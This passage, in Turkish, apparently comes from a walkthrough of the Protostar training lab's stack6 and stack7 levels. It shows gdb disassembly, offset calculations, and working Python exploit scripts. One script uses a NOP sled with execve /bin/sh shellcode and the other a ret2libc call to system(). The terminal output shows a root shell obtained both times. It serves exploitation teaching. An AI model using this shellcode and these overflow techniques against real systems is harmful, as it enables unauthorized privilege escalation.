0x080484aa <getpath+38>:	call   0x8048380 <gets@plt>
0x080484af <getpath+43>:	mov    eax,DWORD PTR [ebp+0x4]
0x080484b2 <getpath+46>:	mov    DWORD PTR [ebp-0xc],eax
0x080484b5 <getpath+49>:	mov    eax,DWORD PTR [ebp-0xc]
0x080484b8 <getpath+52>:	and    eax,0xbf000000
0x080484bd <getpath+57>:	cmp    eax,0xbf000000
0x080484c2 <getpath+62>:	jne    0x80484e4 <getpath+96>
0x080484c4 <getpath+64>:	mov    eax,0x80485e4
0x080484c9 <getpath+69>:	mov    edx,DWORD PTR [ebp-0xc]
0x080484cc <getpath+72>:	mov    DWORD PTR [esp+0x4],edx
0x080484d0 <getpath+76>:	mov    DWORD PTR [esp],eax
0x080484d3 <getpath+79>:	call   0x80483c0 <printf@plt>
0x080484d8 <getpath+84>:	mov    DWORD PTR [esp],0x1
0x080484df <getpath+91>:	call   0x80483a0 <_exit@plt>
0x080484e4 <getpath+96>:	mov    eax,0x80485f0
0x080484e9 <getpath+101>:	lea    edx,[ebp-0x4c]
0x080484ec <getpath+104>:	mov    DWORD PTR [esp+0x4],edx
0x080484f0 <getpath+108>:	mov    DWORD PTR [esp],eax
0x080484f3 <getpath+111>:	call   0x80483c0 <printf@plt>
0x080484f8 <getpath+116>:	leave  
0x080484f9 <getpath+117>:	ret    
End of assembler dump.
(gdb) 
```
Burada dikkat ederseniz stacke yer ayırma işini yaparken şu satırlar çalışıyor:
```
0x080484a4 <getpath+32>:	lea    eax,[ebp-0x4c]
0x080484a7 <getpath+35>:	mov    DWORD PTR [esp],eax
0x080484aa <getpath+38>:	call   0x8048380 <gets@plt>
```
eax registerine `ebp-0x4c` adresi atanıyor, ardından bu değer esp registerine atanıyor. Ebp'den itibaren 0x4c yani 76 bytelık yer ayırıyor.Zaten 4 byte da ebp nin kendisi olduğu için 80  bytetan sonra return adresine yazmıştık hatırlarsanız.
Biz nop dolduracağımız bölümün ortasına zıplamaya çalışalım. 36 tane nop koymuştuk yani hedefimiz esp + 18(0x12) oluyor. Esp=ebp-0x4c ise hedefimizi `ebp - 0x4c + 0x12 = ebp - 0x34` oluyor. ebp değerini bulmak için fonksiyon başındaki mov ebp,esp komutundan sonra breakpoint koyup bakabiliriz.
```
(gdb) b*0x08048487
Breakpoint 2 at 0x8048487: file stack6/stack6.c, line 7.
(gdb) c
Continuing.

Breakpoint 2, 0x08048487 in getpath () at stack6/stack6.c:7
7	in stack6/stack6.c
(gdb) i r
eax            0xbffff714	-1073744108
ecx            0x28e953e2	686380002
edx            0x1	1
ebx            0xb7fd7ff4	-1208123404
esp            0xbffff658	0xbffff658
ebp            0xbffff658	0xbffff658
esi            0x0	0
edi            0x0	0
eip            0x8048487	0x8048487 <getpath+3>
eflags         0x200286	[ PF SF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
```
Görüldüğü gibi `ebp = 0xbffff658`. O zaman zıplayacağımzı adress `0xbffff658 - 0x3a = 0xBFFFF61E ` oluyor. Exploitimizi yazalım:
```python
nops = '\x90'*36
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
junk = "A"*12 + "B"*4
return_addr_of_ret = "\xf9\x84\x04\x08" #0x080484f9
shellcode_addr = "\x1e\xf6\xff\xbf" #0xBFFFF61E

print nops + shellcode + junk + return_addr_of_ret + shellcode_addr
```
Ve çalıştırıyoruz...
```bash
user@protostar:/tmp$ python stack6.py > stack6
user@protostar:/tmp$ cat stack
cat: stack: No such file or directory
user@protostar:/tmp$ cat stack6
������������������������������������1�Ph//shh/bin�����°
                                                       1�@̀AAAAAAAAAAAABBBB�����
user@protostar:/tmp$ (cat stack6;cat)| /opt/protostar/bin/stack6
input path please: got path ������������������������������������1�Ph//shh/bin�����°
                                                                                   1�@̀��AAAAAAAABBBB�����
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
whoami
root
```
Evet root shell aldık :)

## Stack 7
Kaynak kod:
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

char *getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);

  if((ret & 0xb0000000) == 0xb0000000) {
      printf("bzzzt (%p)\n", ret);
      _exit(1);
  }

  printf("got path %s\n", buffer);
  return strdup(buffer);
}

int main(int argc, char **argv)
{
  getpath();
}
```
Bu aşamada kısıtlamalarımızda değişiklik var, return adresimiz bf yerine b ile başyalamaz şeklinde kısıtlanmış. Bu aşamda önceden de söylediğim gibi ret2libc ile shell alamaya çalışacağız. Ret2libc'nin mantığını şu şekilde açıklamaya çalışayım: libc kütüphanesi kocaman bir kütüphane ve bunun içinde system fonksiyonu var. Bu system fonksiyonu ile biz shell komutları çalıştırabiliyoruz. Çalıştıracağımız komutu da argüman olarak veriyoruz. (bkz man system) Bunu stackde yapmamız için gerekli olan ise stack düzenini bunu gerçekleştirecek şekilde düzenlemek. Yani:
```bash
AAAA.... + ebp + return_addr(system fonksiyonunun adresi) + B*4 + 'bin/sh' stringi adresi
```
Şimdi burada ne olacak? Biz return adresini system fonksiyonunun adresi ile ezip /bin/sh stringini de argüman olarak vermiş olacağız ve bu sayede shell alacağız. Ama burada önemli bir nokta var, 4 tane B eklemişiz. Bunun eklememizin sebebi ise system fonksiyonunu fonksiyon çağrısı ile çalıştırmayıp direk zıplayarak çalıştırmamız. Yani normalde biz bir fonksiyona function call ile giderken stack şöyle oluyordu:
```
[düşük adres] ... local değişkenler + ebp + ret_addr + argümanlar ... [yüksek adres]
```
Yani bir return adresi push ediliyordu ve ardından ebp push ediliyordu. Fonksiyonun parametrelerine erişilirlken de ebp + 8 , ebp + 12 şeklinde erişiliyor. Ama bizim durumumuzda biz system fonksiyonunun başlangıcına direk zıplamış olduğumuz için stack'e herhangi bir return adresi push edilmiyo, bu sefer de ebp üzerinden argümanlara erişirken sıkıntı çıkıyor ve iş patlıyor. bu yüzden stack düzenini düzgün oluşturmak için araya sahte bi adres koyuyoruz. İsterseniz burada exit fonksiyonu adresi vs. de koyabilirsiniz tabii. Şimdi system fonksiyonunun adresini bulalım. Programı gdb ile açıp bakalım.
```bash
user@protostar:/opt/protostar/bin$ gdb ./stack7 -q
Reading symbols from /opt/protostar/bin/stack7...done.
(gdb) disas main
Dump of assembler code for function main:
0x08048545 <main+0>:	push   %ebp
0x08048546 <main+1>:	mov    %esp,%ebp
0x08048548 <main+3>:	and    $0xfffffff0,%esp
0x0804854b <main+6>:	call   0x80484c4 <getpath>
0x08048550 <main+11>:	mov    %ebp,%esp
0x08048552 <main+13>:	pop    %ebp
0x08048553 <main+14>:	ret    
End of assembler dump.
(gdb) b*0x08048553
Breakpoint 1 at 0x8048553: file stack7/stack7.c, line 32.
(gdb) r
Starting program: /opt/protostar/bin/stack7 
input path please: AAAAAAAAAAAAAAAa
got path AAAAAAAAAAAAAAAa

Breakpoint 1, 0x08048553 in main (argc=134513989, argv=0x1) at stack7/stack7.c:32
32	stack7/stack7.c: No such file or directory.
	in stack7/stack7.c
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7ecffb0 <__libc_system>
```
system fonksiyonunun adresi `0xb7ecffb0` miş. E biz buna zıplayamayız çünkü b ile başlıyor. O zaman bir önceki çözümde olduğu gibi ret komutunu tekrar çalıştırarak bunu atlatabiliriz. Yani stack içerisini şu iekilde yapmaya çalışacağız:
```bash
AAAA.... + ebp + ret_komutu_adresi + system_adresi + B*4 + '/bin/sh'_adresi
```
Bir önceki aşamadaki gibi getpath fonksiyonundan ret komutunun adresine bakarsak `0x08048544` adresini buluyoruz. Geriye /bin/sh adresini bulmak kaldı. Bunu gdb içinde yapınca garip bir sonuç veriyor o yüzden strings komutu ile bulacağız:
```bash
user@protostar:/opt/protostar/bin$ strings -a -t x /lib/libc-2.11.2.so | grep /bin/sh
 11f3bf /bin/sh
 # -a parametresi tüm dosyaya bakmak için
 # -t x paramteresi bulunan stringin offsetini hex olarak yazdırmak için 
```
Aranan stringin ofsetini dosya içindeki ofsetini bulduk, gdb ile libs programda hangi adreste buna bakalım.
```bash
(gdb) info proc map
process 1588
cmdline = '/opt/protostar/bin/stack7'
cwd = '/opt/protostar/bin'
exe = '/opt/protostar/bin/stack7'
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000          0        /opt/protostar/bin/stack7
	 0x8049000  0x804a000     0x1000          0        /opt/protostar/bin/stack7
	0xb7e96000 0xb7e97000     0x1000          0        
	0xb7e97000 0xb7fd5000   0x13e000          0         /lib/libc-2.11.2.so
	0xb7fd5000 0xb7fd6000     0x1000   0x13e000         /lib/libc-2.11.2.so
	0xb7fd6000 0xb7fd8000     0x2000   0x13e000         /lib/libc-2.11.2.so
	0xb7fd8000 0xb7fd9000     0x1000   0x140000         /lib/libc-2.11.2.so
	0xb7fd9000 0xb7fdc000     0x3000          0        
	0xb7fe0000 0xb7fe2000     0x2000          0        
	0xb7fe2000 0xb7fe3000     0x1000          0           [vdso]
	0xb7fe3000 0xb7ffe000    0x1b000          0         /lib/ld-2.11.2.so
	0xb7ffe000 0xb7fff000     0x1000    0x1a000         /lib/ld-2.11.2.so
	0xb7fff000 0xb8000000     0x1000    0x1b000         /lib/ld-2.11.2.so
	0xbffeb000 0xc0000000    0x15000          0           [stack]
```
libc `0xb7e97000` adresinden başlıyor. Bizim argümanımız olan string `11f3bf` ofsetindeydi. İkisini toplarsak aradığımız adresi `0xB7FB63BF` olarak buluyoruz.O zaman kodu yazalım:
```python
junk = 'A'*80
ret_addr = '\x44\x85\x04\x08' #0x08048544 ret komutu adresi
system_addr = '\xb0\xff\xec\xb7' #0xb7ecffb0 system fonksiyonu adresi
fake_ret = 'B'*4
bin_sh_addr = '\xbf\x63\xfb\xb7' #0xB7FB63BF /bin/sh adresi

print junk + ret_addr + system_addr + fake_ret + bin_sh_addr
```
Ve çalıştıralım...
```bash
user@protostar:/tmp$ (python stack7.py; cat)| /opt/protostar/bin/stack7
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD�AAAAAAAAAAAAD�����BBBB�c��
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
whoami
root
GG :)
```
Bu aşamayı da başarıyla tamamladık ve protostar serisinin stack bölümünü tamamlamış olduk. Okuduğunuz için teşekkürler, umarım bi faydası olmuştur. Protostar format sorularında görüşmek üzere... 
